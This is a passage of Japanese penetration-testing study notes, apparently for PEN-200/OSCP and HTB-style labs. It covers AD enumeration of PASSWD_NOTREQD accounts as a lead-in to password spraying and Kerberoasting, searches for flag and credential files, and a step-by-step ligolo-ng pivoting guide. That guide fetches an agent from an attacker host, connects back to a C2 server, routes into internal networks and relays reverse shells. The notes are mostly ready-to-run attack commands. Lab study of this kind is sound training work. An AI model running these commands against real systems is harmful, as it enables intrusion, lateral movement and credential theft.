  CN=FREIGHTLOGISTIC$,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                         2080
```
上のコマンドの詳細
- 出力されるuserAccountは、それぞれのフラグの足し算なので、以下を見て、分解すればどのアカウントがどのフラグが立っているかがわかる
userAccountControlのフラグの一覧
- https://learn.microsoft.com/ja-jp/troubleshoot/windows-server/active-directory/useraccountcontrol-manipulate-account-properties#list-of-property-flags

- 発見次第、除外すべきアカウント
	- 「CN=Guest」 : ゲストアカウント。基本的に無効化されてることが多いから、激アツではない
	- 「CN=XXX`$`」: `$`がついているので、コンピュータアカウント。コンピュータアカウントにPASSWD_NOTREQDが付いてるのは普通なので激アツではない。

さらに確認すべきポイント
- dsquery で気になるユーザーが見つかったら、次にそのアカウントが実際にログオン可能な状態かどうかを確認するのが重要
注意点
- net user "氏名" /domain のようにスペースを含むフルネーム（CN）を使って net user を実行すると、エラーになることがある。
- これは net user が sAMAccountName（ログオン名） を必要とするため
そのため、対象ユーザーのログオン名を調べるには、以下のように sAMAccountName を取得する
```sh
dsquery * -filter "(&(objectCategory=person)(cn=Yolanda Groce))" -attr sAMAccountName
```

得られたログオン名(yolandag)を使って、以下のように net user で詳細情報を確認する
```sh
net user yolandag /domain
```

- こうすることで、アカウントが有効かどうか・グループ所属・ログオン可能かどうかをチェックでき、そこからパスワードスプレーやKerberoastingなど、次の攻撃ステップに進む判断材料になる。


LDAP OIDマッチングルール一覧

|**OID値**|**名前（非公式）**|**意味・用途**|**使用例・特徴**|
|---|---|---|---|
|1.2.840.113556.1.4.803|Bitwise AND 完全一致|**指定したビット値に完全一致する属性のみを検索**|単一のUAC属性にマッチさせたいときに使う（例：PASSWD_NOTREQDが設定されている）|
|1.2.840.113556.1.4.804|Bitwise OR 部分一致|**ビット値のいずれかが一致すれば対象に含める**|複数の属性が混在しているオブジェクトを柔軟に検索できる|
|1.2.840.113556.1.4.1941|DNツリー探索|**オブジェクトの所有関係やグループメンバーシップなどを辿って検索**|ネストされたグループメンバーなどを再帰的に検索するときに便利|
### Linux


# その他

## フラグの検索
### Linux

- ファイル名が`user.txt`の場合
```bas
find / -type f -iname "user.txt" 2>/dev/null
```

- ファイル名が`root.txt`の場合
```bash
find / -type f -iname "root.txt" 2>/dev/null
```

`grep`を使用して特定の文字列を含むファイルを検索
- `user`という文字列を検索（大文字・小文字を無視）
```bash
grep -ri "user" / 2>/dev/null
```
- `root`という文字列を検索（大文字・小文字を無視）
```bash
grep -ri "root" / 2>/dev/null
```

クレデンシャルファイルの検索
```shell-session
find /mnt/Finance/ -name *cred*
```

```shell-session
grep -rn /mnt/Finance/ -ie cred
```
### Windows

Cドライブ全体を検索する場合  

まずは、これを試す
```sh
Get-ChildItem -Path C:\ -Recurse -Filter flag.txt -ErrorAction SilentlyContinue
```

**Offsec系**
local.txt (一般ユーザー)
```sh
Get-ChildItem -Path C:\ -Recurse -Filter local.txt -ErrorAction SilentlyContinue
```
proof.txt (管理者権限)
```sh
Get-ChildItem -Path C:\ -Recurse -Filter proof.txt -ErrorAction SilentlyContinue
```

以下は、環境によって正しく動かない可能性あり
- CMD
```cmd
dir C:\flag.txt /s /b
```

```Powershell
dir -Recurse -Filter flag.txt 2>$null
```
- PowerShell
クレデンシャルファイルの検索
```powershell-session
Get-ChildItem -Recurse -Path N:\ -Include *cred* -File
```




## ligolo-ng
- https://docs.ligolo.ng/Quickstart/

### 1. 必要なリソースのダウンロード
```sh
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8/ligolo-ng_proxy_0.8_linux_amd64.tar.gz
tar -xzf ligolo-ng_proxy_0.8_linux_amd64.tar.gz
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8/ligolo-ng_agent_0.8_linux_amd64.tar.gz
tar -xzf ligolo-ng_agent_0.8_linux_amd64.tar.gz
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8/ligolo-ng_agent_0.8_windows_amd64.zip
unzip ligolo-ng_agent_0.8_windows_amd64.zip
python -m http.server 8081
```

上でやったバイナリがダメな時
```sh
go version

sudo apt update
sudo apt install golang-go -y

cd /tmp
git clone https://github.com/nicocha30/ligolo-ng
cd ligolo-ng
go build -o proxy cmd/proxy/main.go

# ビルドしたバイナリをコピー
sudo cp proxy ~/Desktop/PEN-200/Challenge1-Medtech/proxy_compiled
cd ~/Desktop/PEN-200/Challenge1-Medtech
sudo ./proxy_compiled -selfcert
```
### 2. 攻撃者サーバー での設定
```sh
sudo ./proxy -selfcert
```
- device or resource busy というエラーが出た場合は、攻撃者マシンの**別のターミナル**で
`sudo ip link delete ligolo0` を実行してから再度試す

仮想NICの作成
```sh
interface_create --name ligolo0
```
### 3.ターゲット側の設定
#### Linux
ダウンロード
```sh
wget http://10.10.14.4:8081/agent
```
実行
```sh
./agent -connect <C2サーバーのIPまたはドメイン>:11601 -ignore-cert
```

#### Windows
```PS
powershell .\agent.exe -connect <攻撃者サーバーのIPアドレス>:11601 -ignore-cert
```

### 4.攻撃者側での設定
- proxy を起動すると、プロンプトが表示されます。Agentが接続してくると、proxyのコンソールに通知があります。
 ```sh
session
tunnel_start --tun ligolo0
ifconfig
```
- ifconfigは、ターゲットの内部ネットワーク情報の確認のために行う、攻撃者のNICではない。
	- 例えば、eth0 インターフェースに 172.16.1.100/24 と表示されていれば、ターゲットの内部ネットワークは 172.16.1.0/24

別のターミナルで
```sh
sudo ip route add <ターゲットの内部ネットワークCIDR(例 :  172.16.1.0/24)> dev ligolo0
```

#### エラーとその対応
```sh
┌──(kali㉿kali)-[~/Desktop/PEN-200/Challenge0-Secura]
└─$ sudo ip route add 192.168.191.0/24 dev ligolo0
RTNETLINK answers: File exists
```

ip routeで、どうなってるのかを確認
```sh
ip route
```

部分的にligoloを使いたい
- 192.168.191.95は、tun0(VPN)経由で、それ以外の191.96・191.97はligolo経由が良い
```sh
# 191.0/24全体のルートは削除
sudo ip route del 192.168.191.0/24 via 192.168.45.254 dev tun0

# 191.95だけVPN経由の静的ルート
sudo ip route add 192.168.191.95/32 via 192.168.45.254 dev tun0

# それ以外をLigolo経由
sudo ip route add 192.168.191.0/24 dev ligolo0

# 確認
ip route | grep 192.168.191
```
### ユースケース別

#### Nmap
- Ligolo-ngを使ってる時は、`nmap -sn`だとエラーが起きる
	- `nmap -PE -sn `でエラーを防ぐことができつつ、ICMPエコーリクエストのみで調査できる
```sh
nmap -PE -sn <ターゲットの内部ネットワークCIDR>
```

#### リバースシェル
- https://arth0s.medium.com/ligolo-ng-pivoting-reverse-shells-and-file-transfers-6bfb54593fa5#:~:text=add%20some%20listeners.-,Reverse%20Shells,-Let%E2%80%99s%20say%20that
	- 簡潔にいうと、
	- 1. agent.exeを動かしているマシンの内部側のIPで、ポートは1234で、リバースシェルを作成する
	- 2. ligolo-ngで、以下を実行する
```sh
[Agent : WEB02\Administrator@WEB02] »  listener_add --addr 0.0.0.0:1234 --to 0.0.0.0:4444
```

## 内部ファイルの持ち出し
 [[File Transfer]]
## 内部ファイルの暗号化
[[File Encryption]]
## Windowsローカルパスワード攻撃
[[Windows Local Password Attack]]
- パスワードハッシュを取得して、ハッシュをクラックすることによって、パスワードを不正に取得する
## ActiveDirectory
[[Pentest_Technique/Active Directory]]